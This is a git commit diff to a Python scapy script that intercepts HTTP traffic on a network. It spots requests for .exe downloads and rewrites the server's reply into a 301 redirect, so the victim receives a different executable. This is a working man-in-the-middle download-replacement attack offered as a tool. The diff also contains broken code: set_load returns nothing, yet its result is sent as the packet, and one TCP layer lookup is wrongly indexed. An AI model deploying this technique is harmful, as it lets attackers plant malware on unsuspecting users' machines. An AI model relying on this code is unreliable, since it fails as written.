a30b0919e4b52609d8bd18361acc05e0f0d96d50
developerkhashab <mohammad.khashab.mk@gmail.com>
2020-06-01 15:09:49 -0400

    Add Replace download script

--- Replace_downloads/replace_downloads.py
+++ Replace_downloads/replace_downloads.py
@@ -4,6 +4,11 @@ import scapy.all as scapy
 
 ack_list = []
 
+def set_load(packet,load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
 
 # processing packet for further changes, like now we are redirecting to another IP
 def process_packet(packet):
@@ -12,25 +17,20 @@ def process_packet(packet):
 
     # check scapy packet if it has dns response
     if scapy_packet.haslayer(scapy.Raw):
-        print(scapy_packet.show())
         # checking if it is HTTP request by destination port (dport)
-        if scapy_packet[scapy.TCP].dport == '80':
-            print("HTTP Request")
-
+        if scapy_packet[scapy.TCP].dport == 80:
             # checking request if contain any excutable file requested to download
             # you can change the type of file as u want like .pdf
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-        elif scapy_packet[scapy.TCP].sport == '80':
+        elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy_packet.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy_packet.TCP].seq)
                 print("[+] Replacing file")
-                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/predownload.html?spV=true&subD=true&f=winrar-x64-590.exe \n\n"
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(bytes(scapy_packet))
+                modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://www.win-rar.com/predownload.html?spV=true&subD=true&f=winrar-x64-590.exe \n\n")
+
+                packet.set_payload(bytes(modified_packet))
 
 
     packet.accept()
@@ -44,3 +44,4 @@ queue.run()
 # seq field in the TCP section
 # EXAMPLE so the request has ACK=X3X3
 # the response will had seq=X3X3
+# don't forget iptables
